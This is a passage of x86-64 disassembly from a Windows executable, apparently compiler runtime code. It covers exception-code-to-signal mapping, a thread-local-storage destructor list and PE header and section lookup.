  40a5a4:	48 85 d2             	test   %rdx,%rdx
  40a5a7:	b8 01 00 00 00       	mov    $0x1,%eax
  40a5ac:	74 b5                	je     0x40a563
  40a5ae:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a5b3:	ff d2                	call   *%rdx
  40a5b5:	31 c0                	xor    %eax,%eax
  40a5b7:	48 83 c4 28          	add    $0x28,%rsp
  40a5bb:	c3                   	ret
  40a5bc:	0f 1f 40 00          	nopl   0x0(%rax)
  40a5c0:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  40a5c5:	74 65                	je     0x40a62c
  40a5c7:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  40a5cc:	75 40                	jne    0x40a60e
  40a5ce:	31 d2                	xor    %edx,%edx
  40a5d0:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a5d5:	e8 b6 0f 00 00       	call   0x40b590
  40a5da:	48 83 f8 01          	cmp    $0x1,%rax
  40a5de:	0f 84 88 00 00 00    	je     0x40a66c
  40a5e4:	48 85 c0             	test   %rax,%rax
  40a5e7:	74 79                	je     0x40a662
  40a5e9:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a5ee:	ff d0                	call   *%rax
  40a5f0:	31 c0                	xor    %eax,%eax
  40a5f2:	e9 6c ff ff ff       	jmp    0x40a563
  40a5f7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40a5fe:	00 00 
  40a600:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40a605:	74 c7                	je     0x40a5ce
  40a607:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  40a60c:	74 1e                	je     0x40a62c
  40a60e:	b8 01 00 00 00       	mov    $0x1,%eax
  40a613:	48 83 c4 28          	add    $0x28,%rsp
  40a617:	c3                   	ret
  40a618:	ba 01 00 00 00       	mov    $0x1,%edx
  40a61d:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a622:	e8 69 0f 00 00       	call   0x40b590
  40a627:	e8 d4 f9 ff ff       	call   0x40a000
  40a62c:	31 c0                	xor    %eax,%eax
  40a62e:	48 83 c4 28          	add    $0x28,%rsp
  40a632:	c3                   	ret
  40a633:	31 d2                	xor    %edx,%edx
  40a635:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a63a:	e8 51 0f 00 00       	call   0x40b590
  40a63f:	48 83 f8 01          	cmp    $0x1,%rax
  40a643:	48 89 c2             	mov    %rax,%rdx
  40a646:	0f 85 58 ff ff ff    	jne    0x40a5a4
  40a64c:	ba 01 00 00 00       	mov    $0x1,%edx
  40a651:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a656:	e8 35 0f 00 00       	call   0x40b590
  40a65b:	31 c0                	xor    %eax,%eax
  40a65d:	e9 01 ff ff ff       	jmp    0x40a563
  40a662:	b8 04 00 00 00       	mov    $0x4,%eax
  40a667:	48 83 c4 28          	add    $0x28,%rsp
  40a66b:	c3                   	ret
  40a66c:	ba 01 00 00 00       	mov    $0x1,%edx
  40a671:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a676:	e8 15 0f 00 00       	call   0x40b590
  40a67b:	31 c0                	xor    %eax,%eax
  40a67d:	e9 e1 fe ff ff       	jmp    0x40a563
  40a682:	ba 01 00 00 00       	mov    $0x1,%edx
  40a687:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a68c:	e8 ff 0e 00 00       	call   0x40b590
  40a691:	31 c0                	xor    %eax,%eax
  40a693:	e9 cb fe ff ff       	jmp    0x40a563
  40a698:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a69f:	00 
  40a6a0:	41 54                	push   %r12
  40a6a2:	55                   	push   %rbp
  40a6a3:	57                   	push   %rdi
  40a6a4:	56                   	push   %rsi
  40a6a5:	53                   	push   %rbx
  40a6a6:	48 83 ec 20          	sub    $0x20,%rsp
  40a6aa:	e8 a1 07 00 00       	call   0x40ae50
  40a6af:	48 89 c5             	mov    %rax,%rbp
  40a6b2:	8b 05 50 aa 02 00    	mov    0x2aa50(%rip),%eax        # 0x435108
  40a6b8:	85 c0                	test   %eax,%eax
  40a6ba:	75 25                	jne    0x40a6e1
  40a6bc:	48 85 ed             	test   %rbp,%rbp
  40a6bf:	74 20                	je     0x40a6e1
  40a6c1:	48 8d 0d 28 c8 00 00 	lea    0xc828(%rip),%rcx        # 0x416ef0
  40a6c8:	c7 05 36 aa 02 00 01 	movl   $0x1,0x2aa36(%rip)        # 0x435108
  40a6cf:	00 00 00 
  40a6d2:	e8 99 05 00 00       	call   0x40ac70
  40a6d7:	48 85 c0             	test   %rax,%rax
  40a6da:	74 14                	je     0x40a6f0
  40a6dc:	b8 01 00 00 00       	mov    $0x1,%eax
  40a6e1:	48 83 c4 20          	add    $0x20,%rsp
  40a6e5:	5b                   	pop    %rbx
  40a6e6:	5e                   	pop    %rsi
  40a6e7:	5f                   	pop    %rdi
  40a6e8:	5d                   	pop    %rbp
  40a6e9:	41 5c                	pop    %r12
  40a6eb:	c3                   	ret
  40a6ec:	0f 1f 40 00          	nopl   0x0(%rax)
  40a6f0:	48 8d 1d 29 ab 02 00 	lea    0x2ab29(%rip),%rbx        # 0x435220
  40a6f7:	b9 30 00 00 00       	mov    $0x30,%ecx
  40a6fc:	31 f6                	xor    %esi,%esi
  40a6fe:	48 8d 15 1b aa 02 00 	lea    0x2aa1b(%rip),%rdx        # 0x435120
  40a705:	48 89 df             	mov    %rbx,%rdi
  40a708:	f3 48 ab             	rep stos %rax,(%rdi)
  40a70b:	4c 8d 25 ee fd ff ff 	lea    -0x212(%rip),%r12        # 0x40a500
  40a712:	b9 20 00 00 00       	mov    $0x20,%ecx
  40a717:	48 89 d7             	mov    %rdx,%rdi
  40a71a:	f3 48 ab             	rep stos %rax,(%rdi)
  40a71d:	49 29 ec             	sub    %rbp,%r12
  40a720:	48 89 d7             	mov    %rdx,%rdi
  40a723:	eb 2e                	jmp    0x40a753
  40a725:	c6 07 09             	movb   $0x9,(%rdi)
  40a728:	48 83 c6 01          	add    $0x1,%rsi
  40a72c:	48 83 c3 0c          	add    $0xc,%rbx
  40a730:	44 89 67 04          	mov    %r12d,0x4(%rdi)
  40a734:	8b 50 0c             	mov    0xc(%rax),%edx
  40a737:	89 53 f4             	mov    %edx,-0xc(%rbx)
  40a73a:	03 50 08             	add    0x8(%rax),%edx
  40a73d:	48 89 f8             	mov    %rdi,%rax
  40a740:	48 83 c7 08          	add    $0x8,%rdi
  40a744:	48 29 e8             	sub    %rbp,%rax
  40a747:	89 43 fc             	mov    %eax,-0x4(%rbx)
  40a74a:	89 53 f8             	mov    %edx,-0x8(%rbx)
  40a74d:	48 83 fe 20          	cmp    $0x20,%rsi
  40a751:	74 32                	je     0x40a785
  40a753:	48 89 f1             	mov    %rsi,%rcx
  40a756:	e8 75 06 00 00       	call   0x40add0
  40a75b:	48 85 c0             	test   %rax,%rax
  40a75e:	75 c5                	jne    0x40a725
  40a760:	48 85 f6             	test   %rsi,%rsi
  40a763:	0f 84 73 ff ff ff    	je     0x40a6dc
  40a769:	89 f2                	mov    %esi,%edx
  40a76b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40a770:	48 8d 0d a9 aa 02 00 	lea    0x2aaa9(%rip),%rcx        # 0x435220
  40a777:	49 89 e8             	mov    %rbp,%r8
  40a77a:	ff 15 04 0c 03 00    	call   *0x30c04(%rip)        # 0x43b384
  40a780:	e9 57 ff ff ff       	jmp    0x40a6dc
  40a785:	ba 20 00 00 00       	mov    $0x20,%edx
  40a78a:	eb e4                	jmp    0x40a770
  40a78c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a790:	53                   	push   %rbx
  40a791:	48 83 ec 20          	sub    $0x20,%rsp
  40a795:	48 8b 11             	mov    (%rcx),%rdx
  40a798:	8b 02                	mov    (%rdx),%eax
  40a79a:	48 89 cb             	mov    %rcx,%rbx
  40a79d:	89 c1                	mov    %eax,%ecx
  40a79f:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  40a7a5:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  40a7ab:	0f 84 df 00 00 00    	je     0x40a890
  40a7b1:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  40a7b6:	0f 87 84 00 00 00    	ja     0x40a840
  40a7bc:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  40a7c1:	0f 83 94 00 00 00    	jae    0x40a85b
  40a7c7:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  40a7cc:	0f 84 c8 00 00 00    	je     0x40a89a
  40a7d2:	77 3f                	ja     0x40a813
  40a7d4:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  40a7d9:	0f 84 bb 00 00 00    	je     0x40a89a
  40a7df:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40a7e4:	75 3f                	jne    0x40a825
  40a7e6:	31 d2                	xor    %edx,%edx
  40a7e8:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a7ed:	e8 9e 0d 00 00       	call   0x40b590
  40a7f2:	48 83 f8 01          	cmp    $0x1,%rax
  40a7f6:	0f 84 34 01 00 00    	je     0x40a930
  40a7fc:	48 85 c0             	test   %rax,%rax
  40a7ff:	74 24                	je     0x40a825
  40a801:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a806:	ff d0                	call   *%rax
  40a808:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a80d:	48 83 c4 20          	add    $0x20,%rsp
  40a811:	5b                   	pop    %rbx
  40a812:	c3                   	ret
  40a813:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40a818:	0f 84 99 00 00 00    	je     0x40a8b7
  40a81e:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  40a823:	74 75                	je     0x40a89a
  40a825:	48 8b 05 d4 a8 02 00 	mov    0x2a8d4(%rip),%rax        # 0x435100
  40a82c:	48 85 c0             	test   %rax,%rax
  40a82f:	74 dc                	je     0x40a80d
  40a831:	48 89 d9             	mov    %rbx,%rcx
  40a834:	48 83 c4 20          	add    $0x20,%rsp
  40a838:	5b                   	pop    %rbx
  40a839:	48 ff e0             	rex.W jmp *%rax
  40a83c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a840:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  40a845:	0f 84 99 00 00 00    	je     0x40a8e4
  40a84b:	77 58                	ja     0x40a8a5
  40a84d:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  40a852:	74 46                	je     0x40a89a
  40a854:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  40a859:	75 ca                	jne    0x40a825
  40a85b:	31 d2                	xor    %edx,%edx
  40a85d:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a862:	e8 29 0d 00 00       	call   0x40b590
  40a867:	48 83 f8 01          	cmp    $0x1,%rax
  40a86b:	0f 84 d8 00 00 00    	je     0x40a949
  40a871:	48 85 c0             	test   %rax,%rax
  40a874:	74 af                	je     0x40a825
  40a876:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a87b:	ff d0                	call   *%rax
  40a87d:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a882:	48 83 c4 20          	add    $0x20,%rsp
  40a886:	5b                   	pop    %rbx
  40a887:	c3                   	ret
  40a888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40a88f:	00 
  40a890:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  40a894:	0f 85 17 ff ff ff    	jne    0x40a7b1
  40a89a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a89f:	48 83 c4 20          	add    $0x20,%rsp
  40a8a3:	5b                   	pop    %rbx
  40a8a4:	c3                   	ret
  40a8a5:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  40a8aa:	74 ee                	je     0x40a89a
  40a8ac:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  40a8b1:	0f 85 6e ff ff ff    	jne    0x40a825
  40a8b7:	31 d2                	xor    %edx,%edx
  40a8b9:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a8be:	e8 cd 0c 00 00       	call   0x40b590
  40a8c3:	48 83 f8 01          	cmp    $0x1,%rax
  40a8c7:	74 4a                	je     0x40a913
  40a8c9:	48 85 c0             	test   %rax,%rax
  40a8cc:	0f 84 53 ff ff ff    	je     0x40a825
  40a8d2:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a8d7:	ff d0                	call   *%rax
  40a8d9:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a8de:	48 83 c4 20          	add    $0x20,%rsp
  40a8e2:	5b                   	pop    %rbx
  40a8e3:	c3                   	ret
  40a8e4:	31 d2                	xor    %edx,%edx
  40a8e6:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a8eb:	e8 a0 0c 00 00       	call   0x40b590
  40a8f0:	48 83 f8 01          	cmp    $0x1,%rax
  40a8f4:	0f 85 77 ff ff ff    	jne    0x40a871
  40a8fa:	ba 01 00 00 00       	mov    $0x1,%edx
  40a8ff:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a904:	e8 87 0c 00 00       	call   0x40b590
  40a909:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a90e:	e9 fa fe ff ff       	jmp    0x40a80d
  40a913:	ba 01 00 00 00       	mov    $0x1,%edx
  40a918:	b9 04 00 00 00       	mov    $0x4,%ecx
  40a91d:	e8 6e 0c 00 00       	call   0x40b590
  40a922:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a927:	e9 e1 fe ff ff       	jmp    0x40a80d
  40a92c:	0f 1f 40 00          	nopl   0x0(%rax)
  40a930:	ba 01 00 00 00       	mov    $0x1,%edx
  40a935:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40a93a:	e8 51 0c 00 00       	call   0x40b590
  40a93f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40a944:	e9 c4 fe ff ff       	jmp    0x40a80d
  40a949:	ba 01 00 00 00       	mov    $0x1,%edx
  40a94e:	b9 08 00 00 00       	mov    $0x8,%ecx
  40a953:	e8 38 0c 00 00       	call   0x40b590
  40a958:	e8 a3 f6 ff ff       	call   0x40a000
  40a95d:	e9 38 ff ff ff       	jmp    0x40a89a
  40a962:	90                   	nop
  40a963:	90                   	nop
  40a964:	90                   	nop
  40a965:	90                   	nop
  40a966:	90                   	nop
  40a967:	90                   	nop
  40a968:	90                   	nop
  40a969:	90                   	nop
  40a96a:	90                   	nop
  40a96b:	90                   	nop
  40a96c:	90                   	nop
  40a96d:	90                   	nop
  40a96e:	90                   	nop
  40a96f:	90                   	nop
  40a970:	55                   	push   %rbp
  40a971:	57                   	push   %rdi
  40a972:	56                   	push   %rsi
  40a973:	53                   	push   %rbx
  40a974:	48 83 ec 28          	sub    $0x28,%rsp
  40a978:	48 8d 0d 41 aa 02 00 	lea    0x2aa41(%rip),%rcx        # 0x4353c0
  40a97f:	ff 15 8f 09 03 00    	call   *0x3098f(%rip)        # 0x43b314
  40a985:	48 8b 1d 14 aa 02 00 	mov    0x2aa14(%rip),%rbx        # 0x4353a0
  40a98c:	48 85 db             	test   %rbx,%rbx
  40a98f:	74 33                	je     0x40a9c4
  40a991:	48 8b 2d 34 0a 03 00 	mov    0x30a34(%rip),%rbp        # 0x43b3cc
  40a998:	48 8b 3d 95 09 03 00 	mov    0x30995(%rip),%rdi        # 0x43b334
  40a99f:	90                   	nop
  40a9a0:	8b 0b                	mov    (%rbx),%ecx
  40a9a2:	ff d5                	call   *%rbp
  40a9a4:	48 89 c6             	mov    %rax,%rsi
  40a9a7:	ff d7                	call   *%rdi
  40a9a9:	85 c0                	test   %eax,%eax
  40a9ab:	75 0e                	jne    0x40a9bb
  40a9ad:	48 85 f6             	test   %rsi,%rsi
  40a9b0:	74 09                	je     0x40a9bb
  40a9b2:	48 8b 43 08          	mov    0x8(%rbx),%rax
  40a9b6:	48 89 f1             	mov    %rsi,%rcx
  40a9b9:	ff d0                	call   *%rax
  40a9bb:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
  40a9bf:	48 85 db             	test   %rbx,%rbx
  40a9c2:	75 dc                	jne    0x40a9a0
  40a9c4:	48 8d 0d f5 a9 02 00 	lea    0x2a9f5(%rip),%rcx        # 0x4353c0
  40a9cb:	48 83 c4 28          	add    $0x28,%rsp
  40a9cf:	5b                   	pop    %rbx
  40a9d0:	5e                   	pop    %rsi
  40a9d1:	5f                   	pop    %rdi
  40a9d2:	5d                   	pop    %rbp
  40a9d3:	48 ff 25 92 09 03 00 	rex.W jmp *0x30992(%rip)        # 0x43b36c
  40a9da:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40a9e0:	55                   	push   %rbp
  40a9e1:	57                   	push   %rdi
  40a9e2:	56                   	push   %rsi
  40a9e3:	53                   	push   %rbx
  40a9e4:	48 83 ec 28          	sub    $0x28,%rsp
  40a9e8:	8b 05 ba a9 02 00    	mov    0x2a9ba(%rip),%eax        # 0x4353a8
  40a9ee:	31 f6                	xor    %esi,%esi
  40a9f0:	85 c0                	test   %eax,%eax
  40a9f2:	89 cd                	mov    %ecx,%ebp
  40a9f4:	48 89 d7             	mov    %rdx,%rdi
  40a9f7:	75 0b                	jne    0x40aa04
  40a9f9:	89 f0                	mov    %esi,%eax
  40a9fb:	48 83 c4 28          	add    $0x28,%rsp
  40a9ff:	5b                   	pop    %rbx
  40aa00:	5e                   	pop    %rsi
  40aa01:	5f                   	pop    %rdi
  40aa02:	5d                   	pop    %rbp
  40aa03:	c3                   	ret
  40aa04:	ba 18 00 00 00       	mov    $0x18,%edx
  40aa09:	b9 01 00 00 00       	mov    $0x1,%ecx
  40aa0e:	e8 05 0c 00 00       	call   0x40b618
  40aa13:	48 85 c0             	test   %rax,%rax
  40aa16:	48 89 c3             	mov    %rax,%rbx
  40aa19:	74 3d                	je     0x40aa58
  40aa1b:	89 28                	mov    %ebp,(%rax)
  40aa1d:	48 8d 0d 9c a9 02 00 	lea    0x2a99c(%rip),%rcx        # 0x4353c0
  40aa24:	48 89 78 08          	mov    %rdi,0x8(%rax)
  40aa28:	ff 15 e6 08 03 00    	call   *0x308e6(%rip)        # 0x43b314
  40aa2e:	48 8b 05 6b a9 02 00 	mov    0x2a96b(%rip),%rax        # 0x4353a0
  40aa35:	48 8d 0d 84 a9 02 00 	lea    0x2a984(%rip),%rcx        # 0x4353c0
  40aa3c:	48 89 1d 5d a9 02 00 	mov    %rbx,0x2a95d(%rip)        # 0x4353a0
  40aa43:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40aa47:	ff 15 1f 09 03 00    	call   *0x3091f(%rip)        # 0x43b36c
  40aa4d:	89 f0                	mov    %esi,%eax
  40aa4f:	48 83 c4 28          	add    $0x28,%rsp
  40aa53:	5b                   	pop    %rbx
  40aa54:	5e                   	pop    %rsi
  40aa55:	5f                   	pop    %rdi
  40aa56:	5d                   	pop    %rbp
  40aa57:	c3                   	ret
  40aa58:	be ff ff ff ff       	mov    $0xffffffff,%esi
  40aa5d:	eb 9a                	jmp    0x40a9f9
  40aa5f:	90                   	nop
  40aa60:	53                   	push   %rbx
  40aa61:	48 83 ec 20          	sub    $0x20,%rsp
  40aa65:	8b 05 3d a9 02 00    	mov    0x2a93d(%rip),%eax        # 0x4353a8
  40aa6b:	85 c0                	test   %eax,%eax
  40aa6d:	89 cb                	mov    %ecx,%ebx
  40aa6f:	75 0f                	jne    0x40aa80
  40aa71:	31 c0                	xor    %eax,%eax
  40aa73:	48 83 c4 20          	add    $0x20,%rsp
  40aa77:	5b                   	pop    %rbx
  40aa78:	c3                   	ret
  40aa79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  40aa80:	48 8d 0d 39 a9 02 00 	lea    0x2a939(%rip),%rcx        # 0x4353c0
  40aa87:	ff 15 87 08 03 00    	call   *0x30887(%rip)        # 0x43b314
  40aa8d:	48 8b 05 0c a9 02 00 	mov    0x2a90c(%rip),%rax        # 0x4353a0
  40aa94:	48 85 c0             	test   %rax,%rax
  40aa97:	74 1a                	je     0x40aab3
  40aa99:	8b 10                	mov    (%rax),%edx
  40aa9b:	39 d3                	cmp    %edx,%ebx
  40aa9d:	75 0b                	jne    0x40aaaa
  40aa9f:	eb 4b                	jmp    0x40aaec
  40aaa1:	8b 11                	mov    (%rcx),%edx
  40aaa3:	39 da                	cmp    %ebx,%edx
  40aaa5:	74 29                	je     0x40aad0
  40aaa7:	48 89 c8             	mov    %rcx,%rax
  40aaaa:	48 8b 48 10          	mov    0x10(%rax),%rcx
  40aaae:	48 85 c9             	test   %rcx,%rcx
  40aab1:	75 ee                	jne    0x40aaa1
  40aab3:	48 8d 0d 06 a9 02 00 	lea    0x2a906(%rip),%rcx        # 0x4353c0
  40aaba:	ff 15 ac 08 03 00    	call   *0x308ac(%rip)        # 0x43b36c
  40aac0:	31 c0                	xor    %eax,%eax
  40aac2:	48 83 c4 20          	add    $0x20,%rsp
  40aac6:	5b                   	pop    %rbx
  40aac7:	c3                   	ret
  40aac8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40aacf:	00 
  40aad0:	48 8b 51 10          	mov    0x10(%rcx),%rdx
  40aad4:	48 89 50 10          	mov    %rdx,0x10(%rax)
  40aad8:	e8 eb 0a 00 00       	call   0x40b5c8
  40aadd:	48 8d 0d dc a8 02 00 	lea    0x2a8dc(%rip),%rcx        # 0x4353c0
  40aae4:	ff 15 82 08 03 00    	call   *0x30882(%rip)        # 0x43b36c
  40aaea:	eb d4                	jmp    0x40aac0
  40aaec:	48 8b 50 10          	mov    0x10(%rax),%rdx
  40aaf0:	48 89 c1             	mov    %rax,%rcx
  40aaf3:	48 89 15 a6 a8 02 00 	mov    %rdx,0x2a8a6(%rip)        # 0x4353a0
  40aafa:	eb dc                	jmp    0x40aad8
  40aafc:	0f 1f 40 00          	nopl   0x0(%rax)
  40ab00:	53                   	push   %rbx
  40ab01:	48 83 ec 20          	sub    $0x20,%rsp
  40ab05:	83 fa 01             	cmp    $0x1,%edx
  40ab08:	0f 84 92 00 00 00    	je     0x40aba0
  40ab0e:	72 30                	jb     0x40ab40
  40ab10:	83 fa 02             	cmp    $0x2,%edx
  40ab13:	74 1b                	je     0x40ab30
  40ab15:	83 fa 03             	cmp    $0x3,%edx
  40ab18:	75 1b                	jne    0x40ab35
  40ab1a:	8b 05 88 a8 02 00    	mov    0x2a888(%rip),%eax        # 0x4353a8
  40ab20:	85 c0                	test   %eax,%eax
  40ab22:	74 11                	je     0x40ab35
  40ab24:	e8 47 fe ff ff       	call   0x40a970
  40ab29:	eb 0a                	jmp    0x40ab35
  40ab2b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  40ab30:	e8 cb f4 ff ff       	call   0x40a000
  40ab35:	b8 01 00 00 00       	mov    $0x1,%eax
  40ab3a:	48 83 c4 20          	add    $0x20,%rsp
  40ab3e:	5b                   	pop    %rbx
  40ab3f:	c3                   	ret
  40ab40:	8b 05 62 a8 02 00    	mov    0x2a862(%rip),%eax        # 0x4353a8
  40ab46:	85 c0                	test   %eax,%eax
  40ab48:	0f 85 82 00 00 00    	jne    0x40abd0
  40ab4e:	8b 05 54 a8 02 00    	mov    0x2a854(%rip),%eax        # 0x4353a8
  40ab54:	83 f8 01             	cmp    $0x1,%eax
  40ab57:	75 dc                	jne    0x40ab35
  40ab59:	48 8b 0d 40 a8 02 00 	mov    0x2a840(%rip),%rcx        # 0x4353a0
  40ab60:	48 85 c9             	test   %rcx,%rcx
  40ab63:	74 11                	je     0x40ab76
  40ab65:	48 8b 59 10          	mov    0x10(%rcx),%rbx
  40ab69:	e8 5a 0a 00 00       	call   0x40b5c8
  40ab6e:	48 85 db             	test   %rbx,%rbx
  40ab71:	48 89 d9             	mov    %rbx,%rcx
  40ab74:	75 ef                	jne    0x40ab65
  40ab76:	48 8d 0d 43 a8 02 00 	lea    0x2a843(%rip),%rcx        # 0x4353c0
  40ab7d:	48 c7 05 18 a8 02 00 	movq   $0x0,0x2a818(%rip)        # 0x4353a0
  40ab84:	00 00 00 00 
  40ab88:	c7 05 16 a8 02 00 00 	movl   $0x0,0x2a816(%rip)        # 0x4353a8
  40ab8f:	00 00 00 
  40ab92:	ff 15 74 07 03 00    	call   *0x30774(%rip)        # 0x43b30c
  40ab98:	eb 9b                	jmp    0x40ab35
  40ab9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40aba0:	8b 05 02 a8 02 00    	mov    0x2a802(%rip),%eax        # 0x4353a8
  40aba6:	85 c0                	test   %eax,%eax
  40aba8:	74 16                	je     0x40abc0
  40abaa:	c7 05 f4 a7 02 00 01 	movl   $0x1,0x2a7f4(%rip)        # 0x4353a8
  40abb1:	00 00 00 
  40abb4:	b8 01 00 00 00       	mov    $0x1,%eax
  40abb9:	48 83 c4 20          	add    $0x20,%rsp
  40abbd:	5b                   	pop    %rbx
  40abbe:	c3                   	ret
  40abbf:	90                   	nop
  40abc0:	48 8d 0d f9 a7 02 00 	lea    0x2a7f9(%rip),%rcx        # 0x4353c0
  40abc7:	ff 15 97 07 03 00    	call   *0x30797(%rip)        # 0x43b364
  40abcd:	eb db                	jmp    0x40abaa
  40abcf:	90                   	nop
  40abd0:	e8 9b fd ff ff       	call   0x40a970
  40abd5:	e9 74 ff ff ff       	jmp    0x40ab4e
  40abda:	90                   	nop
  40abdb:	90                   	nop
  40abdc:	90                   	nop
  40abdd:	90                   	nop
  40abde:	90                   	nop
  40abdf:	90                   	nop
  40abe0:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  40abe4:	48 01 c1             	add    %rax,%rcx
  40abe7:	31 c0                	xor    %eax,%eax
  40abe9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
  40abef:	75 09                	jne    0x40abfa
  40abf1:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
  40abf7:	0f 94 c0             	sete   %al
  40abfa:	0f b6 c0             	movzbl %al,%eax
  40abfd:	c3                   	ret
  40abfe:	66 90                	xchg   %ax,%ax
  40ac00:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
  40ac05:	74 09                	je     0x40ac10
  40ac07:	31 c0                	xor    %eax,%eax
  40ac09:	c3                   	ret
  40ac0a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  40ac10:	eb ce                	jmp    0x40abe0
  40ac12:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  40ac19:	1f 84 00 00 00 00 00 
  40ac20:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
  40ac24:	48 01 c1             	add    %rax,%rcx
  40ac27:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
  40ac2b:	48 8d 44 01 18       	lea    0x18(%rcx,%rax,1),%rax
  40ac30:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
  40ac34:	85 c9                	test   %ecx,%ecx
  40ac36:	74 29                	je     0x40ac61
  40ac38:	83 e9 01             	sub    $0x1,%ecx
  40ac3b:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
  40ac3f:	4c 8d 4c c8 28       	lea    0x28(%rax,%rcx,8),%r9
  40ac44:	44 8b 40 0c          	mov    0xc(%rax),%r8d
  40ac48:	49 39 d0             	cmp    %rdx,%r8
  40ac4b:	4c 89 c1             	mov    %r8,%rcx
  40ac4e:	77 08                	ja     0x40ac58
  40ac50:	03 48 08             	add    0x8(%rax),%ecx
  40ac53:	48 39 ca             	cmp    %rcx,%rdx
  40ac56:	72 0b                	jb     0x40ac63
  40ac58:	48 83 c0 28          	add    $0x28,%rax
  40ac5c:	4c 39 c8             	cmp    %r9,%rax
  40ac5f:	75 e3                	jne    0x40ac44
  40ac61:	31 c0                	xor    %eax,%eax
  40ac63:	c3                   	ret
  40ac64:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  40ac6b:	00 00 00 00 00 
  40ac70:	57                   	push   %rdi
  40ac71:	56                   	push   %rsi
  40ac72:	53                   	push   %rbx
  40ac73:	48 83 ec 20          	sub    $0x20,%rsp
  40ac77:	48 89 ce             	mov    %rcx,%rsi
  40ac7a:	e8 01 09 00 00       	call   0x40b580
  40ac7f:	48 83 f8 08          	cmp    $0x8,%rax
  40ac83:	77 69                	ja     0x40acee
  40ac85:	48 8b 15 b4 cb 00 00 	mov    0xcbb4(%rip),%rdx        # 0x417840
  40ac8c:	31 db                	xor    %ebx,%ebx
  40ac8e:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
  40ac93:	74 0b                	je     0x40aca0
  40ac95:	48 89 d8             	mov    %rbx,%rax
  40ac98:	48 83 c4 20          	add    $0x20,%rsp
  40ac9c:	5b                   	pop    %rbx
  40ac9d:	5e                   	pop    %rsi
  40ac9e:	5f                   	pop    %rdi
  40ac9f:	c3                   	ret
  40aca0:	48 89 d1             	mov    %rdx,%rcx
  40aca3:	e8 38 ff ff ff       	call   0x40abe0
  40aca8:	85 c0                	test   %eax,%eax
  40acaa:	74 e9                	je     0x40ac95
  40acac:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
  40acb0:	48 01 d0             	add    %rdx,%rax
  40acb3:	0f b7 50 14          	movzwl 0x14(%rax),%edx
  40acb7:	48 8d 5c 10 18       	lea    0x18(%rax,%rdx,1),%rbx
  40acbc:	0f b7 40 06          	movzwl 0x6(%rax),%eax
  40acc0:	85 c0                	test   %eax,%eax
  40acc2:	74 2a                	je     0x40acee
  40acc4:	83 e8 01             	sub    $0x1,%eax
  40acc7:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
